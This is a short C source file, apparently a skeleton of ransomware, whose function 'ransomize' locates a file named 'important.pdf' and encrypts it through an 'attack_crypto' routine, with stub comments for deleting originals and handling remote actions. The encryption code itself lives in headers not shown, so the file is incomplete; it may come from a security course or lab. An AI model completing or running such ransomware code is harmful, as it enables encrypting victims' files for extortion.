#include "attack.h"
#include "attack_crypto.h"
#include "get_relative_path.h"
#include <stdio.h>

int ransomize(void)
{
    /* Target files */
    char important[MAX_PATH];
    if (get_relative_path(important, sizeof(important), "important.pdf") != 0) {
        return 1;
    }

    /* Generate key, encrypt files and key */
    attack_crypto(important);
    
    crypto_cleanup();

    /* Delete original files */
    
    /* Handle remote actions */

    /* Cleanup */

    return 0;
}
